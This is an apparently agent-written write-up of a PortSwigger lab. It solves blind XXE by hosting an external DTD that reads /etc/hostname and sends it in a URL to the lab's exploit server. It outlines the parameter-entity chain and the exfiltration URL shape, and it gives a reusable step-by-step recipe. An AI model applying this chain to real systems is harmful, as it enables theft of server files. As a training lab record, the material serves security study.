# PortSwigger Lab

## Lab

Exploiting blind XXE to exfiltrate data using a malicious external DTD

URL: https://0ad400cc03c6e2de843ffbdf00d50016.web-security-academy.net/

## Vulnerability Class

XXE injection, blind OOB exfiltration via malicious external DTD – file content embedded in outbound URL to exploit server; value read from access log, submitted via answer oracle (`{"correct":true}`)

## Objective

Exfiltrate `/etc/hostname` via OOB DTD and submit its value. Established by lab description (exfil + submit flow) + `{"correct":true}` + `is-solved`. Official solution consulted for objective/target confirmation only after channel proven (hostname in log first).

## Initial Observations

- Shop + XML stock-check (`POST /product/stock`) – same sink shape as 7 prior XXE labs (current evidence from product page).
- Baseline (`productId=1,storeId=1`) → 200 `251` (count oracle).
- General entity (`file:///etc/passwd` + `&xxe;`) → `400 "Entities are not allowed for security reasons"` – body references blocked (same control as parameter-entities lab).
- Exploit server provided (Craft-a-response STORE + `GET /log` access log discovered by probing – log endpoint found without browser).
- Submit-solution button (`POST /submitSolution`, `answer` – known form-encoded contract from SVG lab).
- Stored `methodology/xxe.md` (7 shapes incl. parameter-entity OOB + error-exfil DTD trio; no OOB-EXFIL-to-log shape). No prior log-exfil labs.

## Hypotheses

- H1: Parameter-entity external DTD bypasses the body block (proven pattern); DTD with `%file;` + `%eval;` + `%exfil;` to `http://exploit-server/exfil?x=%file;` exfiltrates file content into access log. Evidence needed: backend `GET /exfil.dtd` (Java UA) in log, then `/exfil?x=<content>`.
- H2: Unknown target path – prove channel with KNOWN file (`/etc/hostname`) before guessing secrets. Evidence needed: hostname in log.
- H3: Submitted log value satisfies answer oracle → `{"correct":true}` → marker.

## Attempts

1. Baseline product page + baseline POST (`251`) – sink + shape in 2 requests.
2. General-entity probe → `Entities are not allowed` – block confirmed (1 request, abandoned).
3. Exploit-server recon (`GET /` → Craft form) + direct `POST /` STORE `/exfil.dtd` (secret-targeted trio) + `GET /exfil.dtd` byte-verify – H3-infra ready without browser.
4. Clean-body reference trigger → backend fetched DTD (`10.0.3.226 ... Java/21.0.1`) but NO `/exfil?x=` followed – correctly read as target-path failure (channel engaged: DTD fetched; exfil step produced nothing → `%file;` resolution failed), NOT parser hardening.
5. Re-STOREd DTD with `/etc/hostname` (known file – H2) → verified served → re-triggered → log: `GET /exfil?x=420062c1dd54` (Java UA) – channel + value proven.
6. `POST /submitSolution answer=420062c1dd54` (form-encoded, known contract) → `{"correct":true}` → `GET /` → `is-solved`/`Solved`/`Congratulations`.

## What Failed

- `/home/carlos/secret` as first exfil target (assumed from lab family, not evidence) – silent no-exfil after DTD fetch. Diagnosed via log comparison (DTD fetched both times; exfil only with known file) → path wrong, channel fine. Lesson: known-file channel proof BEFORE secret guesses.

## What Worked

- External-DTD exfil trio + access-log readback + known-file-first discipline + form-encoded submit. ~10 requests.

## Burp Observations

- Baseline, block confirmation, exploit-server recon/STORE/verify/log-polling, triggers, submit (`{"correct":true}`), proof – all via Burp MCP (no browser tab opened).

## Browser Observations

- Not required. Deliberately avoided (direct STORE/log/trigger POSTs are equivalent).

## CLI / Tool Observations

- No CLI tools – Burp replay answered every question. No crawler/fuzzer (single known endpoint).

## Root Cause

Blocklist covers body general-entity references; external parameter-entity DTDs still fetched and fully evaluated, including nested entity definitions that embed local file content into outbound request URLs. Attacker DTD → server-side file read → HTTP request to attacker log with content in path. Data (XML) → DTD fetch → file read → OOB exfil.

## Verification

- Channel proof: backend `GET /exfil.dtd` (internal IP, Java UA) in log – fetch engaged.
- Negative control: secret-target DTD fetched but no exfil followed (path failure isolated from channel failure).
- Value proof: `/exfil?x=420062c1dd54` in log (known-file ground truth) – content read from attacker infrastructure, not inferred.
- Oracle proof: `{"correct":true}` on submit + global `is-solved` via fresh anon `GET /`.

## Impact

Blind arbitrary file exfiltration to attacker infrastructure (demonstrated hostname; same primitive reads any `file://` path – sources/keys/secrets – URL-length permitting). Plus submit-oracle pattern for secret-value labs.

## Why The Successful Approach Worked

- Proved OOB-EXFIL channel with a KNOWN file before spending the secret guess – log showed DTD-fetch-without-exfil, correctly attributed to path (not parser).
- Read the access log as the primary oracle (`GET /log` discovered by probing) – exfil value never touches lab responses.
- Reused submit contract (form-encoded `answer`) from SVG lab verbatim – no protocol guessing.

## Generalization

- For blind XXE + exploit-server labs: baseline → block probe → STORE exfil-DTD (file/eval/exfil trio) → VERIFY served bytes → trigger → poll `GET /log` → if DTD fetched but no exfil: target PATH wrong (prove with `/etc/hostname` first) → exfiltrate → submit per known contract.
- DTD-fetch without exfil-follow = path/permission failure, NOT channel failure – change the file, not the technique.
- Known-file-first (`/etc/hostname`) grounds every OOB-exfil chain before secret guesses.

## Lessons Learned

- Access logs are first-class oracles for OOB labs: `GET /log` endpoint discovery belongs in the recon sequence (before triggering).
- Channel-vs-target failure split via log comparison (fetch logged in both cases; exfil only with valid path) – read both lines, attribute precisely.
- Submit contracts transfer across labs (`answer`, form-encoded, `{"correct":true}`) – reuse, but verify with one submission.

## Related Methodology

- Extends `methodology/xxe.md` (no OOB-exfil-to-log shape – update justified below; 8th XXE lab, new exfil primitive + log oracle + known-file-first discipline).
- `methodology/injection.md` does NOT apply. Deliberately not modified.
- Priors: `xxe-blind-error-based-exfiltration.md` (external-DTD STORE/verify/trigger mechanics reused verbatim), `xxe-blind-oob-parameter-entities.md` (`%xxe;` syntax + clean body), `xxe-svg-avatar-file-upload.md` (submit contract).

## References

- Solved instance: https://0ad400cc03c6e2de843ffbdf00d50016.web-security-academy.net/
- Lab: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration
- Key artifacts (current evidence): backend DTD fetch (`10.0.3.226 ... Java/21.0.1`), exfil hit (`GET /exfil?x=420062c1dd54`), `{"correct":true}`
- Submitted value (instance-bound): `420062c1dd54` (expired with lab)
- Deliberately shaped chain from stored patterns + log evidence; official solution consulted for objective/target confirmation only after channel proven.
